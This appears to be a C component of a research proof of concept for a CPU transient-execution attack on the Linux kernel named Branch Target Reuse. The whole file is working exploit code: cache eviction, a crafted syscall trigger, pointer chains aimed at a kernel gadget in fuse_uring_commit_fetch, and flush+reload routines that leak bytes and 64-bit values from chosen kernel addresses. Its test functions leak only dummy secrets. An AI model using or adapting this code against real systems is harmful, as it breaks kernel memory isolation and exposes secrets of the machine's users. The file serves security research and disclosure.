/*
 * Branch Target Reuse (BTR)
 * April 30th 2026
 * Sander Wiebing
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <time.h>
#include <signal.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <syscall.h>
#include <sys/time.h>

#include "flush_and_reload.h"
#include "targets.h"
#include "common.h"
#include "controller.h"


void * reload_set[0x100];

static void link_ev_set(void ** ev_set, int ev_set_size) {

    void **next;
	for (int i = 0; i < ev_set_size; i++) {
		next = ev_set[i];
		*next = ev_set[(i + 1) % ev_set_size];
	}

}


static __always_inline int trigger_victim(struct config *cfg) {

    // printf("arg_fr_buf %p\n", cfg->arg_fr_buf);

    // rdi (0x10), rsi (0x18), rdx (0x20), r10 (0x28), r8 (0x30), and r9 (0x38)
    if (cfg->constant_blind_safe == 0) {
        asm volatile(
            "mov %%rbx, %%r9\n"
            "push %%rax\n"
            "syscall\n"
            "pop %%rax\n"
            :
            :
                "a" (cfg->target_gadget_32), // syscall number
                "D" (cfg->arg_tfp),
                "S" (cfg->arg_fr_buf), // +0x18 (rsi)
                "d" (cfg->arg_cmp_value), // 0x20 (rdx)
                "b" (cfg->arg_secret_address) // +0x38 (r9)
            : "r11", "rcx", "r9"

      );

    } else {
        asm volatile(
            "mov %%rbx, %%r9\n"
            "push %%rax\n"
            "syscall\n"
            "pop %%rax\n"
            :
            :
                "a" (0xdead10), // syscall number
                "D" (cfg->arg_ind_map),
                "S" (0), // +0x18 (rsi)
                "d" (0), // 0x20 (rdx)
                "b" (0) // +0x38 (r9)
            : "r11", "rcx", "r9"

      );
    }

    return 0;

}

static void get_shuffled_array(int min, int max, int array[]) {

    for (int i = min; i < max; i++) {
        array[i] = i;
    }

    for (int i = min; i < max; i++) {
        int temp = array[i];
        int randomIndex = rand() % max;

        array[i]           = array[randomIndex];
        array[randomIndex] = temp;
    }
}



int cb_do_flush_and_reload(struct config * cfg, uint64_t hits[0x100], uint8_t cl_half) {

    char buf_test[17];
    int total_hits = 0;

    if (cfg->debug_evict) {
        read_uint64_from_fd(cfg->fd_evict);
    } else {
        for (size_t i = 0; i < 2; i++)
        {
            if (cfg->ev_set_l2_prog[0]) {
                evict(cfg->ev_set_l2_prog);
                asm volatile("lfence\n");
            }
            if (cfg->ev_set_l3[0]) {
                evict(cfg->ev_set_l3);
                asm volatile("lfence\n");
            }
        }
    }
    asm volatile("lfence\n");

    // trigger
    trigger_victim(cfg);
    cpuid();

    for (size_t i = 0; i <= 0xff; i += 1) {
        size_t byte = ((i * 167) + 13) & 0xff;
        char * addr = cfg->reload_addr + (byte << 11);

        if (byte % 2 == cl_half) {
            continue;
        }

        if(load_time(addr) < THR) {
            hits[byte] += 1;
            total_hits += 1;
        }
    }

    return total_hits;


}

static uint64_t total_time_ready;
static uint64_t total_time_insertion;
static uint64_t total_w_iter_ready;
static uint64_t total_w_iter_insertion;


void cb_do_train_and_reload(struct config * cfg, uint64_t iterations, uint64_t hits[0x100], uint8_t ret_on_hit) {
    uint64_t total_hits;
    uint64_t w_time = 0;
    struct timeval t0, t1;

    total_time_ready = 0;
    total_time_insertion = 0;
    total_w_iter_ready = 0;
    total_w_iter_insertion = 0;

    for(uint64_t iter=0; iter < iterations; iter++) {

        for (size_t cl_half = 0; cl_half < 2; cl_half++)
        {

            asm volatile("prefetcht0 (%0)" :: "r" (cfg->fr_buf_kern));
            asm volatile("prefetcht0 (%0)" :: "r" (cfg->leak_gadget_address[cfg->gadget_nr]));

            for (size_t byte = 0; byte <= 0xff; byte += 1) {
                if (byte % 2 == cl_half) {
                    continue;
                }
                flush(cfg->reload_addr + (byte << 11));
            }
            asm volatile("sfence\n");

            w_time = 0;
            while (controller_status != CONT_GADGET_INSERTED) {
                sched_yield();
                if (++w_time % 100000 == 0) {
                    printf("Waiting for CONT_GADGET_INSERTED! %lu\n", w_time);
                }
            }

            total_hits = cb_do_flush_and_reload(cfg, hits, cl_half);

            controller_status = CONT_CLEAN_UP;
            if (ret_on_hit && total_hits == 1) {
                break;
            }

        }

    }

    // printf("READY: %lu AVG it %4.1f T us | INSERTION: %lu AVG it %4.1f T us  | Iter: %lu\n", total_w_iter_ready / iterations, (double) total_time_ready / iterations, total_w_iter_insertion / iterations,  (double) total_time_insertion / iterations, iterations);
    fflush(stdout);

}


// ----------------------------------------------------------------------------
// Load chain setup functions
//
// ----------------------------------------------------------------------------



void cb_set_load_chain_n_loads(struct config * cfg, int number_of_loads) {
    // ------------------------------------------------------------------------
    //    <fuse_uring_commit_fetch+22>:     mov    rax,QWORD PTR [rdi+0x8] ; load secret address
    //    <fuse_uring_commit_fetch+26>:     mov    rcx,QWORD PTR [rdx+0x230] ; load &base
    //    <fuse_uring_commit_fetch+33>:     mov    DWORD PTR [rbp-0x2c],esi ;
    //    <fuse_uring_commit_fetch+36>:     mov    rbx,QWORD PTR [rax+0x38] ;
    //    <fuse_uring_commit_fetch+40>:     movzx  eax,WORD PTR [rax+0x40] ; load secret 16-byte
    //    <fuse_uring_commit_fetch+44>:     mov    QWORD PTR [rbp-0x38],rbx ;
    //    <fuse_uring_commit_fetch+48>:     test   rcx,rcx
    //    <fuse_uring_commit_fetch+51>:     je     0xffffffff81991603 <fuse_uring_commit_fetch+595>
    //    <fuse_uring_commit_fetch+57>:     cmp    rax,QWORD PTR [rcx+0x8]
    //    <fuse_uring_commit_fetch+61>:     jae    0xffffffff81991614 <fuse_uring_commit_fetch+612>
    //    <fuse_uring_commit_fetch+67>:     mov    rcx,QWORD PTR [rcx+0x18] ; load base address
    //    <fuse_uring_commit_fetch+71>:     mov    r12,QWORD PTR [rcx+rax*8] ; transmit

    memset(cfg->ind_map, 0, 0x100);
    cfg->arg_tfp = 0;   // rdi + 0x10
    cfg->arg_secret_address = 0; /// rdi + 0x20 // rdi + 0x38
    cfg->arg_fr_buf = 0;  // rdi + 0x28 // rdi + 0x18

    switch (number_of_loads)
    {
    case 1:
        cfg->arg_ind_map = (uint8_t *) cfg->fr_buf_kern;

        break;
    case 2:
        cfg->arg_ind_map = (uint8_t *) cfg->fr_buf_kern;

        break;

    case 3:
        cfg->arg_ind_map = (uint8_t *) cfg->ind_map_kern;
        *(uint64_t *)(cfg->ind_map) = (uint64_t) cfg->debug_gadget_address;
        *(uint64_t *)(cfg->ind_map + 0x8) = (uint64_t) cfg->secret_addr_kern - cfg->secret_address_offset;
        cfg->ind_secret_addr = (uint64_t * ) (cfg->ind_map + 0x8);

        *(uint64_t *)(cfg->ind_map + 0x230) = (uint64_t)(cfg->ind_map_kern + 0x10 - 0x18);
        *(uint64_t *)(cfg->ind_map + 0x10) = (uint64_t) cfg->fr_buf_kern;
        cfg->ind_base_addr = (uint64_t * ) (cfg->ind_map + 0x10);

        *(uint32_t *)cfg->secret_addr = 0xdead;
        *cfg->ind_base_addr = (uint64_t) cfg->fr_buf_kern - (0xdead * 8);

        break;


    }

}

void cb_set_load_chain_leak_secret(struct config * cfg)
{
    // ------------------------------------------------------------------------
    //    <fuse_uring_commit_fetch+22>:     mov    rax,QWORD PTR [rdi+0x8] ; load secret address
    //    <fuse_uring_commit_fetch+26>:     mov    rcx,QWORD PTR [rdx+0x230] ; load &base
    //    <fuse_uring_commit_fetch+33>:     mov    DWORD PTR [rbp-0x2c],esi ;
    //    <fuse_uring_commit_fetch+36>:     mov    rbx,QWORD PTR [rax+0x38] ;
    //    <fuse_uring_commit_fetch+40>:     movzx  eax,WORD PTR [rax+0x40] ; load secret 16-byte
    //    <fuse_uring_commit_fetch+44>:     mov    QWORD PTR [rbp-0x38],rbx ;
    //    <fuse_uring_commit_fetch+48>:     test   rcx,rcx
    //    <fuse_uring_commit_fetch+51>:     je     0xffffffff81991603 <fuse_uring_commit_fetch+595>
    //    <fuse_uring_commit_fetch+57>:     cmp    rax,QWORD PTR [rcx+0x8]
    //    <fuse_uring_commit_fetch+61>:     jae    0xffffffff81991614 <fuse_uring_commit_fetch+612>
    //    <fuse_uring_commit_fetch+67>:     mov    rcx,QWORD PTR [rcx+0x18] ; load base address
    //    <fuse_uring_commit_fetch+71>:     mov    r12,QWORD PTR [rcx+rax*8] ; transmit


    cfg->arg_ind_map = (uint8_t *) cfg->ind_map_kern;
    *(uint64_t *)(cfg->ind_map) = (uint64_t) cfg->debug_gadget_address;
    *(uint64_t *)(cfg->ind_map + 0x8) = (uint64_t) cfg->secret_addr_kern - cfg->secret_address_offset;
    cfg->ind_secret_addr = (uint64_t * ) (cfg->ind_map + 0x8);

    *(uint64_t *)(cfg->ind_map + 0x230) = (uint64_t)(cfg->ind_map_kern + 0x10 - 0x18);
    *(uint64_t *)(cfg->ind_map + 0x10) = (uint64_t) cfg->fr_buf_kern;
    cfg->ind_base_addr = (uint64_t * ) (cfg->ind_map + 0x10);

}



static uint64_t total_time_train_and_reload;


void cb_print_leakage_rate(struct config * cfg, uint64_t iterations) {
    uint64_t reload_hits[0x100];
    uint64_t hits[3];

    printf("      L2    L3\n");


    uint64_t total_hits = 0;
    struct timeval t0, t1;
    total_time_train_and_reload = 0;

    for (size_t i = 0; i < 10; i++)
    {

        for (size_t loads = 1; loads < 3; loads++) {hits[loads] = 0;};

        for (size_t loads = 1; loads < 3; loads++)
        {
            memset(reload_hits, 0x0, sizeof(reload_hits));
            cb_set_load_chain_n_loads(cfg, loads + 1);

            gettimeofday(&t0, NULL);
            cb_do_train_and_reload(cfg, iterations, reload_hits, 0);
            gettimeofday(&t1, NULL);

            hits[loads] = reload_hits[0];

            total_hits += hits[loads];
            total_time_train_and_reload += (t1.tv_sec - t0.tv_sec) * 1000000 + (t1.tv_usec - t0.tv_usec);


        }
        printf("Hits: %4lu  %4lu /%4lu  Evict: %d Debug: %d\n", hits[1], hits[2], iterations, cfg->do_evict, cfg->debug_evict);
        fflush(stdout);
    }

    printf("Iteration Avg time: %4.1f us. Hit rate: %4.3f\n", (double) total_time_train_and_reload / 10 / 2 / iterations, (double) total_hits / 10  / 2 / iterations);
}



int cb_leak_byte_forwards(struct config * cfg, uint64_t prefix) {

    uint64_t fr_offset;
    uint64_t hits[0x100] = {0};
    cfg->reload_addr = cfg->fr_buf;

    uint64_t max_hits = 0;
    uint64_t second_hit = 0;
    int max_byte = -1;


    for (size_t outer = 0; outer < 3; outer++)
    {

        *cfg->ind_base_addr = (uint64_t)(cfg->fr_buf_kern - prefix * 8);

        cb_do_train_and_reload(cfg, 3, hits, 0);

        for (int byte = 0x0; byte <= 0xff; byte++) {

            if (hits[byte] > max_hits) {
                max_hits = hits[byte];
                max_byte = byte;
            } else if (byte != max_byte && hits[byte] > second_hit) {
                second_hit = hits[byte];
            }

        }

        if (max_byte != -1 && max_hits - second_hit >= 2) {
            break;
        }

    }

    cfg->reload_addr = cfg->fr_buf;

    if (max_hits == second_hit) {
        return -1;
    }

    return max_byte;

}


uint64_t cb_leak_64bit_value_forwards(struct config * cfg, uint8_t * address, uint32_t prefix) {

    uint32_t cur_prefix;
    uint64_t iter;
    int found;
    uint8_t leaked_bytes[8 + 3] = {0};
    *(uint32_t *) leaked_bytes = prefix;
    uint8_t * cur_byte = &leaked_bytes[3];

    uint8_t * old_arg_secret_address = cfg->arg_secret_address;
    *cfg->ind_secret_addr = (uint64_t) address - cfg->secret_address_offset - 3;

    cfg->fr_buf = cfg->ind_map + 0x10000;
    cfg->fr_buf_kern = cfg->ind_map_kern + 0x10000;

    for (int i = 0; i < 8; i++)
    {
        iter = 0;
        cur_prefix = *((uint32_t *) (cur_byte - 3));

        found = cb_leak_byte_forwards(cfg, cur_prefix);
        while (found == -1 ) {
            found = cb_leak_byte_forwards(cfg, cur_prefix);
            iter++;
            if (iter == 100) {
                printf("Failed finding byte at %p. cur_prefix: 0x%08x\n", address + i, cur_prefix);
                return -1;
            }

        }

        *cur_byte = found;


        cur_byte += 1;
        *cfg->ind_secret_addr += 1;

    }

    *cfg->ind_secret_addr = (uint64_t) old_arg_secret_address;

    return *((uint64_t *) (leaked_bytes + 3));
}


// ----------------------------------------------------------------------------
// Leak test functions
//
// ----------------------------------------------------------------------------

// ----------------------------------------------------------------------------
// Leak Core functions
//
// ----------------------------------------------------------------------------


#define LEAK_RATE_TEST_SIZE (128) // 128 bytes;

void cb_leak_test_leakage_rate(struct config * cfg) {

    // ------------------------------------------------------------------------
    // Initialize a random buffer to leak

    // We initialize the secret from the fifth 4k page onwards
    uint8_t *secret = cfg->ind_map + 0x2000;
    uint8_t *secret_kern = cfg->ind_map_kern + 0x2000;

    for (size_t i = 0; i < LEAK_RATE_TEST_SIZE; i++) {
        secret[i] = ((uint8_t) rand());
    }
    memset(secret, 0, 1); // First byte is zero to start the leak

    uint8_t * leaked_bytes = calloc(1, LEAK_RATE_TEST_SIZE);

    cb_set_load_chain_leak_secret(cfg);

    // ------------------------------------------------------------------------
    // Start the leak

    uint64_t prefix;
    uint8_t * cur_byte;
    int found;

    *cfg->ind_secret_addr = (uint64_t) secret_kern - cfg->secret_address_offset;
    cur_byte = (uint8_t *) leaked_bytes + 1;

    printf("[%50s]", "");
    int step = 0;
    fflush(stdout);

    struct timeval t0, t1;
    uint64_t delta_us, total_delta;
    total_delta = 0;

    gettimeofday(&t0, NULL);


    struct timeval b0, b1;


    for (int i = 0; i < LEAK_RATE_TEST_SIZE; i++)
    {
        prefix = *((uint32_t *) (cur_byte - 1));

        found = cb_leak_byte_forwards(cfg, prefix);

        size_t iter = 0 ;
        while (found == -1 ) {
            if (iter == 1000) {
                printf("\nStuck! Please try again. (IDX: %d Last leaked byte: %x, Last Secret byte: %x)\n", i, *(cur_byte - 1), secret[i + 3 - 1]);
                free(leaked_bytes);
                return;
            }

            found = cb_leak_byte_forwards(cfg, prefix);
            iter++;

        }

        *cur_byte = found;
        cur_byte += 1;
        *cfg->ind_secret_addr += 1;

        if (i % (LEAK_RATE_TEST_SIZE / (50 / 2)) == 0) {
            step++;
            printf("\r[%.*s", step * 2, "..................................................");
            fflush(stdout);
        }

    }

    gettimeofday(&t1, NULL);

    delta_us = (t1.tv_sec - t0.tv_sec) * 1000000 + (t1.tv_usec - t0.tv_usec);

    printf("\nAVG time per byte: %ld\n", delta_us / LEAK_RATE_TEST_SIZE);
    printf("\n%d bytes took %4.1f seconds (%5.1f Byte/sec)\n", LEAK_RATE_TEST_SIZE, (double) delta_us / 1000000, LEAK_RATE_TEST_SIZE / ( (double) delta_us / 1000000));

    // ------------------------------------------------------------------------
    // Verify for any faults

    uint64_t incorrect = 0;

    for (size_t i = 0; i < LEAK_RATE_TEST_SIZE; i++)
    {
        if (secret[i] != leaked_bytes[i]) {
            incorrect += 1;
        }
    }

    printf("Fault rate: %05.3f%%\n", ((double) incorrect / LEAK_RATE_TEST_SIZE) * 100);

    free(leaked_bytes);

}


#define DUMMY_SECRET_LENGTH 27

void cb_leak_dummy_secret(struct config * cfg) {

    // ------------------------------------------------------------------------
    // We setup a dummy secret and try to leak it

    // Initialize secret
    uint8_t *secret = cfg->ind_map + 0x2000;
    uint8_t *secret_kern = cfg->ind_map_kern + 0x2000;

    // To test the zero extend prefix

    for (size_t i = 1; i < DUMMY_SECRET_LENGTH; i++) {
        secret[i] = (uint8_t) ('A' + i - 1);
    }

    memset(secret, 0x0, 1);

    printf("%15s: 0x%016lx\n", "secret addr user", (uint64_t)secret);
    printf("%15s: 0x%016lx\n", "secret addr kern", (uint64_t)secret_kern);


    cb_set_load_chain_leak_secret(cfg);

    uint8_t leaked_bytes[DUMMY_SECRET_LENGTH] = {0};
    leaked_bytes[0] = secret[0];
    uint64_t prefix;
    int found;

    cfg->reload_addr = cfg->fr_buf;
    *cfg->ind_secret_addr = (uint64_t) secret_kern - cfg->secret_address_offset;
    uint8_t * cur_byte = (uint8_t *) leaked_bytes + 1;

    uint64_t iter = 0;


    for (unsigned i = 1; i < DUMMY_SECRET_LENGTH; i++)
    {
        prefix = *((uint16_t *) (cur_byte - 1));

        printf("Using prefix: 0x%04lx\n", prefix);


        found = cb_leak_byte_forwards(cfg, prefix);
        while (found == -1 ) {
            found = cb_leak_byte_forwards(cfg, prefix);
            iter += 1;
        }

        *cur_byte = found;

        printf("0x%03x: Found Byte: 0x%02x (%c) Used prefix: 0x%04lx\n", i, *cur_byte, *cur_byte, prefix);
        printf("Iter: %ld\n", iter);

        cur_byte += 1;
        *cfg->ind_secret_addr += 1;

    }

    printf("Done!\n");

}


